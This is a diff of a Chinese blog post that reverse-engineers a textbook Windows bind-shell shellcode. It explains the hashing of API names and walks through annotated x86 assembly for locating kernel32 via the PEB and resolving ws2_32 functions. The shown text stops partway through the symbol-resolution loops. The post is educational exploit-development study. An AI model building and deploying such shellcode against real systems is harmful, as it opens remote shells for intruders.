@@ -20,43 +20,20 @@
     var CONFIG = {"hostname":"dustball.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Bind_shell哈希算法设计1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法 2.函数名的摘要值尽可能短 3.哈希算法自己的篇幅尽量短 4.哈希后的摘要值可以当作”准nop指令”,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令 书上采取的哈希算法是 123456has">
+  <meta name="description" content="Bind_shell 哈希算法设计 1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法 2.函数名的摘要值尽可能短 3.哈希算法自己的篇幅尽量短 4.哈希后的摘要值可以当作&quot;准nop指令&quot;,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令 书上采取的哈希算法是">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bindshell逆向分析">
 <meta property="og:url" content="http://dustball.top/2022/09/18/Bind-shell/index.html">
 <meta property="og:site_name" content="dustland">
-<meta property="og:description" content="Bind_shell哈希算法设计1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法 2.函数名的摘要值尽可能短 3.哈希算法自己的篇幅尽量短 4.哈希后的摘要值可以当作”准nop指令”,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令 书上采取的哈希算法是 123456has">
+<meta property="og:description" content="Bind_shell 哈希算法设计 1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法 2.函数名的摘要值尽可能短 3.哈希算法自己的篇幅尽量短 4.哈希后的摘要值可以当作&quot;准nop指令&quot;,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令 书上采取的哈希算法是">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918171355607.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174549264.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173600627.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918173623051.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174325158.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918175317614.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918181142886.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191550943.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918191620311.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918192112499.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918195551305.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918194646766.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png">
 <meta property="article:published_time" content="2022-09-18T12:33:00.000Z">
 <meta property="article:modified_time" content="2022-09-18T12:34:13.439Z">
 <meta property="article:author" content="dustball">
 <meta property="article:tag" content="windows pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png">
 
 <link rel="canonical" href="http://dustball.top/2022/09/18/Bind-shell/">
 
@@ -217,13 +194,14 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Bind-shell"><a href="#Bind-shell" class="headerlink" title="Bind_shell"></a>Bind_shell</h1><h2 id="哈希算法设计"><a href="#哈希算法设计" class="headerlink" title="哈希算法设计"></a>哈希算法设计</h2><p>1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法</p>
+        <h1 id="bind_shell">Bind_shell</h1>
+<h2 id="哈希算法设计">哈希算法设计</h2>
+<p>1.哈希算法不能发生碰撞,或者说存在发生碰撞的可能,但是可以肯定的是,首先匹配的就是目标函数.原则上不设计处理碰撞的算法</p>
 <p>2.函数名的摘要值尽可能短</p>
 <p>3.哈希算法自己的篇幅尽量短</p>
-<p>4.哈希后的摘要值可以当作”准nop指令”,即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令</p>
+<p>4.哈希后的摘要值可以当作"准nop指令",即在数值上相当于某些机器码,但是这些机器码的执行不会对shellcode产生影响.如此可以省去跳转指令</p>
 <p>书上采取的哈希算法是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	lodsb 					; load next char into al and increment esi </span><br><span class="line">	xor al, 0x71 				; XOR current char with 0x71 </span><br><span class="line">	sub dl, al 				; update hash with current char </span><br><span class="line">	cmp al, 0x71 				; loop until we reach end of string </span><br><span class="line">	jne hash_loop </span><br></pre></td></tr></table></figure>
-
 <p>dl初始值为0,</p>
 <p>将库函数名逐个字节与0x71异或然后用dl减去该值累计哈希值,</p>
 <p>最终的哈希值放在dl中,只需要1个字节</p>
@@ -236,7 +214,8 @@
 <th>准nop指令</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>LoadLibraryA</td>
 <td>0x59</td>
 <td>pop ecx</td>
@@ -276,7 +255,8 @@
 <td>0x41</td>
 <td>ecx</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>然后紧跟着cmd也写上</p>
 <table>
 <thead>
@@ -286,7 +266,8 @@
 <th>准nop指令</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>C</td>
 <td>0x43</td>
 <td>inc ebx</td>
@@ -301,53 +282,47 @@
 <td>0x64</td>
 <td>FS:</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>准nop指令全都是不疼不痒的指令</p>
 <p>因此bind-shell一开始是这样写的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; start of shellcode </span><br><span class="line">; assume: eax points here </span><br><span class="line">; function hashes (executable as nop-equivalent) </span><br><span class="line">	_emit 0x59	; LoadLibraryA ; pop ecx </span><br><span class="line">	_emit 0x81 	; CreateProcessA ; or ecx, 0x203062d3 </span><br><span class="line">	_emit 0xc9 	; ExitProcess </span><br><span class="line">	_emit 0xd3 	; WSAStartup </span><br><span class="line">	_emit 0x62 	; WSASocketA </span><br><span class="line">	_emit 0x30 	; bind </span><br><span class="line">	_emit 0x20 	; listen </span><br><span class="line">	_emit 0x41 	; accept ; inc ecx </span><br><span class="line"></span><br><span class="line">; &quot;CMd&quot; </span><br><span class="line">	_emit 0x43 	; inc ebx </span><br><span class="line">	_emit 0x4d 	; dec ebp </span><br><span class="line">	_emit 0x64 	; FS: </span><br></pre></td></tr></table></figure>
-
-
-
 <p>_emit相当于db,作用是定义字节数据</p>
 <p>这些数据会被当做指令执行下来,但是影响不大</p>
 <p>用ida反汇编观察这片区域</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">59                            pop     ecx</span><br><span class="line">81 C9 D3 62 30 20             or      ecx, 203062D3h</span><br><span class="line">41                            inc     ecx</span><br><span class="line">43                            inc     ebx</span><br><span class="line">4D                            dec     ebp</span><br><span class="line">                              db      64h</span><br></pre></td></tr></table></figure>
-
 <p>只要是不影响程序计数器eip的指令,比如跳转和调用,都可以作为准nop指令</p>
 <p>后面的指令从windows11上调试会发生错误,需要在windowsXP上调</p>
-<h2 id="解析符号"><a href="#解析符号" class="headerlink" title="解析符号"></a>解析符号</h2><p>用三层循环解析符号,最外圈遍历我们要找的符号,中圈遍历库函数,内圈计算一个库函数的哈希值然后和我们的哈希值进行比较</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png" alt="image-20220918111811581"></p>
+<h2 id="解析符号">解析符号</h2>
+<p>用三层循环解析符号,最外圈遍历我们要找的符号,中圈遍历库函数,内圈计算一个库函数的哈希值然后和我们的哈希值进行比较</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918111811581.png"
+alt="image-20220918111811581" />
+<figcaption aria-hidden="true">image-20220918111811581</figcaption>
+</figure>
 <p>用伪代码表示为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(遍历我们给出的符号哈希表)&#123;</span><br><span class="line">	<span class="keyword">while</span>(遍历库函数名表)&#123;</span><br><span class="line">		<span class="keyword">while</span>(计算一个库函数的哈希值);</span><br><span class="line">		<span class="keyword">if</span>(库函数哈希值=我们给出的哈希值)&#123;</span><br><span class="line">			<span class="comment">//找到了该符号;</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">//没有找到该符号,尝试下一个用库函数来解析本符号;</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(我们的哈希表解析到头)&#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-<h3 id="外圈循环初始化"><a href="#外圈循环初始化" class="headerlink" title="外圈循环初始化"></a>外圈循环初始化</h3><p>使用装载器执行bindshell时,bindshell之前的指令是</p>
+<h3 id="外圈循环初始化">外圈循环初始化</h3>
+<p>使用装载器执行bindshell时,bindshell之前的指令是</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax,bindshell</span><br><span class="line">push eax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
 <p>eax的初始值为bindshell的基地址,bindshell在栈中,因此eax的初始值是一个栈中地址,这对于理解后面的cdq指令是有作用的</p>
-<h4 id="设置函数地址存放空间"><a href="#设置函数地址存放空间" class="headerlink" title="设置函数地址存放空间"></a>设置函数地址存放空间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; start of proper code </span><br><span class="line">	cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) </span><br><span class="line">	xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">	lea edi, [esi - 0x18] 	; edi = addr to start writing function </span><br><span class="line">							; addresses (last addr will be written just </span><br><span class="line">							; before &quot;cmd&quot;) </span><br></pre></td></tr></table></figure>
-
+<h4 id="设置函数地址存放空间">设置函数地址存放空间</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; start of proper code </span><br><span class="line">	cdq 					; set edx = 0 (eax points to stack so is less than 0x80000000) </span><br><span class="line">	xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">	lea edi, [esi - 0x18] 	; edi = addr to start writing function </span><br><span class="line">							; addresses (last addr will be written just </span><br><span class="line">							; before &quot;cmd&quot;) </span><br></pre></td></tr></table></figure>
 <p>cdq指令的作用是eax带符号拓展到edx:eax,又bindshell一开始时,eax寄存器中是一个用户栈地址,显然这个值是一个小于0x80000000的数,那么eax的最高位必然是0,带符号拓展到edx全是0,这就用最短的指令使得edx置零了</p>
-<p>xchg将eax和esi寄存器中的值进行交换,交换前esi&#x3D;0,eax&#x3D;address(shellcode)</p>
-<p>交换后eax&#x3D;0,esi&#x3D;address(shellcode),又shellcode最开始就是<code>_emit 0x59	; LoadLibraryA ; pop ecx </code>即LoadLibraryA函数的摘要值,因此相当于设置好了源操作数</p>
+<p>xchg将eax和esi寄存器中的值进行交换,交换前esi=0,eax=address(shellcode)</p>
+<p>交换后eax=0,esi=address(shellcode),又shellcode最开始就是<code>_emit 0x59  ; LoadLibraryA ; pop ecx</code>即LoadLibraryA函数的摘要值,因此相当于设置好了源操作数</p>
 <p>然后esi-0x18这个地址放到edi上,距离esi共24字节,放到执行方向的反方向,意思是不要干扰shellcode的执行</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png"></p>
+<p><img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" /></p>
 <p><strong>奇怪的是,我们需要解析8个符号,为什么只给了24字节6个符号的地址空间呢?</strong></p>
 <p><strong>这是因为后两个符号将会覆盖一开始给他设定的摘要的位置</strong></p>
-<h4 id="获取kernel32-dll基地址"><a href="#获取kernel32-dll基地址" class="headerlink" title="获取kernel32.dll基地址"></a>获取kernel32.dll基地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>
-
+<h4 id="获取kernel32.dll基地址">获取kernel32.dll基地址</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>
 <p>然后开始定位kernel32.dll的基地址</p>
-<img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="md,绝了" style="zoom: 33%;" />
-
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="md,绝了" style="zoom: 33%;" /></p>
 <p>fs段选择子指向GDT中当前程序的线程环境块描述符,</p>
-<p>用fs段超越寻址,fs:[edx+0x30],此时edx&#x3D;0,实际上相当于fs:[0x30],也就是TEB表的0x30位置,即PEB的指针.</p>
+<p>用fs段超越寻址,fs:[edx+0x30],此时edx=0,实际上相当于fs:[0x30],也就是TEB表的0x30位置,即PEB的指针.</p>
 <table>
 <thead>
 <tr>
@@ -355,7 +330,8 @@
 <th>值意义</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>ebx</td>
 <td>PEB基地址</td>
 </tr>
@@ -367,32 +343,53 @@
 <td>ebp</td>
 <td>kernel32.dll的基地址</td>
 </tr>
-</tbody></table>
-<h4 id="抬栈申请空间"><a href="#抬栈申请空间" class="headerlink" title="抬栈申请空间"></a>抬栈申请空间</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; make some stack space </span><br><span class="line">	mov dh, 0x03 			; sizeof(WSADATA) is 0x190 </span><br><span class="line">	sub esp, edx </span><br></pre></td></tr></table></figure>
-
-<p>edx始终是0,dh&#x3D;0x03则edx&#x3D;0x300</p>
+</tbody>
+</table>
+<h4 id="抬栈申请空间">抬栈申请空间</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; make some stack space </span><br><span class="line">	mov dh, 0x03 			; sizeof(WSADATA) is 0x190 </span><br><span class="line">	sub esp, edx </span><br></pre></td></tr></table></figure>
+<p>edx始终是0,dh=0x03则edx=0x300</p>
 <p>然后抬栈0x300字节</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png" alt="image-20220918174706970"></p>
-<p>先前esp&#x3D;0x12FF38,之后esp&#x3D;0x12FC38</p>
-<h4 id="“ws2-32”字符串压栈"><a href="#“ws2-32”字符串压栈" class="headerlink" title="“ws2_32”字符串压栈"></a>“ws2_32”字符串压栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; push a pointer to &quot;ws2_32&quot; onto stack </span><br><span class="line">	mov dx, 0x3233 			; rest of edx is null </span><br><span class="line">	push edx </span><br><span class="line">	push 0x5f327377 </span><br><span class="line">	push esp </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里有三个压栈,前两个是压入”ws2_32”,后面这个是保存当时的esp位置</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png" alt="image-20220918170246010"></p>
-<h3 id="外圈循环一次开始"><a href="#外圈循环一次开始" class="headerlink" title="外圈循环一次开始"></a>外圈循环一次开始</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
-
-<p>汇编语言中不会平白无故地设置标号的,都是为了方便跳转,这里”find_lib_functions”标号意味着循环开始了</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174706970.png"
+alt="image-20220918174706970" />
+<figcaption aria-hidden="true">image-20220918174706970</figcaption>
+</figure>
+<p>先前esp=0x12FF38,之后esp=0x12FC38</p>
+<h4 id="ws2_32字符串压栈">"ws2_32"字符串压栈</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; push a pointer to &quot;ws2_32&quot; onto stack </span><br><span class="line">	mov dx, 0x3233 			; rest of edx is null </span><br><span class="line">	push edx </span><br><span class="line">	push 0x5f327377 </span><br><span class="line">	push esp </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里有三个压栈,前两个是压入"ws2_32",后面这个是保存当时的esp位置</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918170246010.png"
+alt="image-20220918170246010" />
+<figcaption aria-hidden="true">image-20220918170246010</figcaption>
+</figure>
+<h3 id="外圈循环一次开始">外圈循环一次开始</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">find_lib_functions: </span><br><span class="line">	lodsb 					; load next hash into al and increment esi </span><br><span class="line">	cmp al, 0xd3 				; hash of WSAStartup - trigger </span><br><span class="line">							; LoadLibrary(&quot;ws2_32&quot;) </span><br><span class="line">	jne find_functions </span><br><span class="line">	xchg eax, ebp 			; save current hash </span><br><span class="line">	call [edi - 0xc] 			; LoadLibraryA </span><br><span class="line">	xchg eax, ebp 			; restore current hash, and update ebp </span><br><span class="line">							; with base address of ws2_32.dll </span><br><span class="line">	push edi 					; save location of addr of first winsock function </span><br></pre></td></tr></table></figure>
+<p>汇编语言中不会平白无故地设置标号的,都是为了方便跳转,这里"find_lib_functions"标号意味着循环开始了</p>
 <p>lodsb相当于</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,[esi]</span><br><span class="line">inc esi</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png" alt="image-20220918174632185"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918174632185.png"
+alt="image-20220918174632185" />
+<figcaption aria-hidden="true">image-20220918174632185</figcaption>
+</figure>
 <p>然后al和0xd3比较的意思是,是否是要解析WSAStartup这个函数,如果是,则说明要到ws2_32库中解析函数了,而刚才一直都是在kernel32.dll中解析函数,因此此时需要更换库基址,又已经从kernel32.dll解析了LoadLibraryA,因此可以直接调用该windowsAPI寻找ws2_32.dll的基地址</p>
-<p>如果al&#x3D;0xd3就顺序执行,不跳转,调用LoadLibraryA更换库函数地址,然后再执行find_functions,否则直接跳转find_functions</p>
-<h3 id="中圈循环初始化"><a href="#中圈循环初始化" class="headerlink" title="中圈循环初始化"></a>中圈循环初始化</h3><p>实际上外圈循环一次,中圈就初始化一次,两个可以看成一块</p>
+<p>如果al=0xd3就顺序执行,不跳转,调用LoadLibraryA更换库函数地址,然后再执行find_functions,否则直接跳转find_functions</p>
+<h3 id="中圈循环初始化">中圈循环初始化</h3>
+<p>实际上外圈循环一次,中圈就初始化一次,两个可以看成一块</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find_functions: </span><br><span class="line">	pushad 						; preserve registers </span><br><span class="line">	mov eax, [ebp + 0x3c]		; eax = start of PE header </span><br><span class="line">	mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table </span><br><span class="line">	add ecx, ebp 				; ecx = absolute addr of export table </span><br><span class="line">	mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table </span><br><span class="line">	add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">	xor edi, edi 				; edi will count through the functions </span><br></pre></td></tr></table></figure>
-
 <p>首先将所有寄存器压栈,即使有的寄存器不需要压栈保存,也要使用这条指令,因为它短</p>
-<p>假设当前仍然是在kernel32.dll中解析函数,这意味着find_lib_functions中的push edi不会执行,那么此时的堆栈状态是</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png" alt="image-20220918172313484"></p>
+<p>假设当前仍然是在kernel32.dll中解析函数,这意味着find_lib_functions中的push
+edi不会执行,那么此时的堆栈状态是</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918172313484.png"
+alt="image-20220918172313484" />
+<figcaption aria-hidden="true">image-20220918172313484</figcaption>
+</figure>
 <p>ebp指向的是kernel32.dll或者ws2_32.dll的基地址,库基地址偏移0x3c的地方是库的PE头,</p>
 <p>PE头偏移0x78的地方是导出函数地址(RVA)表的指针,这个地址交给ecx保管</p>
 <p>ecx加上ebp的作用是获得导出函数地址表的绝对虚拟地址(刚才ecx中是相对于库基址的相对虚拟地址)</p>
@@ -406,7 +403,8 @@
 <th>值意义</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>eax</td>
 <td>RVA(PE头)</td>
 </tr>
@@ -422,27 +420,34 @@
 <td>edi</td>
 <td>中圈循环变量,作为导出函数表的下标</td>
 </tr>
-</tbody></table>
-<h3 id="中圈循环一次开始"><a href="#中圈循环一次开始" class="headerlink" title="中圈循环一次开始"></a>中圈循环一次开始</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>
-
+</tbody>
+</table>
+<h3 id="中圈循环一次开始">中圈循环一次开始</h3>
